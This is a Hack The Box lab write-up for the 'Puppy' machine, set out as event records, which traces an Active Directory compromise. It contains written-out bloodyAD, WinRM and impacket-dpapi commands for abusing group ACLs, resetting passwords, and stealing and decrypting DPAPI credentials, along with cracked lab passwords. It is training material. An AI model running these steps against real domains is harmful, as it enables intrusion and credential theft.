title: Hack The Box - Puppy Writeup
description: Walkthrough of HTB Puppy involving assumed breach enumeration, bloodyAD group membership abuse, KeyPass database cracking, password spraying, winRM access, DPAPI credential decryption, and domain compromise.

events.title: Nmap port scan
events.description: Initial port scan to enumerate open services and service versions on the target machine.
events.comments: Identified DNS (53), Kerberos (88), RPC (135), NetBIOS (139), SMB (445), LDAP (389), NFS (111), and domain puppy.htb.

events.title: Enumerate SMB host details and SMB shares
events.description: Uses assumed breach credentials for levy.james to inspect SMB parameters and listed share permissions.
events.comments: Determined DC hostname (DC.puppy.htb) and identified a dev share requiring 'developers' group access.

events.title: BloodHound domain collection
events.description: Collects Active Directory structure and ACL permissions using RustHound for ingestion into BloodHound.
events.comments: Revealed that levy.james is in HR, which has GenericWrite privileges over the 'developers' group.

events.title: Add self to developers group via bloodyAD
events.command: bloodyAD --host puppy.htb -d puppy.htb -u levy.james -p 'REDACTED' add groupMember developers levy.james
events.description: Abuses GenericWrite privilege over the developers group to add levy.james as a member.
events.comments: Grants access to the previously restricted 'dev' SMB share.

events.title: Download KeePass database from dev share
events.description: Connects to the newly accessible dev share and retrieves the KeePass database file.

events.title: Extract hash and crack KeePass database password
events.description: Uses an updated keepass2john script to extract the KDBX v4 hash and John the Ripper to crack it.
events.comments: Cracked KeePass database master password: Liverpool

events.title: Domain password spray
events.description: Extracts domain usernames from BloodHound and password sprays extracted KeePass passwords against SMB.
events.comments: Discovered valid credentials for user ant.edwards (Ant-Man 2025).

events.title: Reset Adam Silver's password and enable account
events.command:
bloodyAD --host puppy.htb -d puppy.htb -u ant.edwards -p 'Ant-Man 2025' set password adam.silver 'PleaseSubscribe!'
bloodyAD --host puppy.htb -d puppy.htb -u ant.edwards -p 'Ant-Man 2025' remove uac -f ACCOUNTDISABLE adam.silver
events.description: Uses ant.edwards (Senior Developers member with GenericAll over adam.silver) to reset password and un-disable the target account.
events.comments: Account adam.silver was disabled by default; removing ACCOUNTDISABLE UAC flag enabled Remote Management (WinRM) access.

events.title: Evil-WinRM initial remote access as Adam Silver
events.description: Establishes an interactive PowerShell remote session on the target as adam.silver.
events.comments: Obtained initial interactive shell access to the host.

events.title: Exfiltrate backup archive and extract credentials
events.command:
download C:\backups\site_backup.zip
unzip site_backup.zip -d backup
cat backup/puppy/NMS_Oconfig.xml.back
events.description: Downloads site backup ZIP file found on C:\backups\ and inspects configuration backup files for hardcoded credentials.
events.comments: Found credentials for Steph Cooper: Steph.Cooper / ChefStef2025.

events.title: Evil-WinRM remote access as Steph Cooper
events.description: Establishes a WinRM session as Steph.Cooper.
events.comments: User Steph Cooper also has an administrative counterpart account Steph.Cooper.ADM.

events.title: Locate and download DPAPI master key and credential blobs
events.command:
copy C:\Users\Steph.Cooper\AppData\Roaming\Microsoft\Protect\<MASTERKEY_ID> masterkey
copy C:\Users\Steph.Cooper\AppData\Roaming\Microsoft\Credentials\<CRED_ID> cred1
attrib -h -s masterkey
attrib -h -s cred1
download masterkey
download cred1
events.description: Identifies DPAPI credential store files via WinPEAS, unsets hidden/system attributes, and downloads them.
events.comments: DPAPI master key and credential blobs obtained from Steph.Cooper's profile.

events.title: Decrypt DPAPI master key and stored Domain Admin credentials
events.command:
impacket-dpapi masterkey -file masterkey -sid <STEPH_SID> -password 'ChefStef2025'
impacket-dpapi credential -file cred1 -key <DECRYPTED_MASTERKEY>
events.description: Uses Impacket's dpapi tool to decrypt the master key using Steph's plaintext password, then decrypts the saved credential blob.
events.comments: Decrypted Domain Admin credentials: Steph.Cooper.ADM / fiveth_chip_on_its_way_2025

events.title: Domain compromise via SecretsDump & Domain Admin access
events.description: Uses Domain Admin credentials to perform an Active Directory secrets dump and log into the domain controller via WinRM to retrieve root.txt.
events.comments: Domain fully compromised; root flag retrieved from C:\Users\Administrator\Desktop\root.txt.

events.title: Restore NTLM hash via Mimikats
events.description: Uploads Mimikats to set the NTLM hash of adam.silver back to its original pre-engagement state.
events.comments: OpSec cleanup step to restore user's original credential hash without violating password history policies.
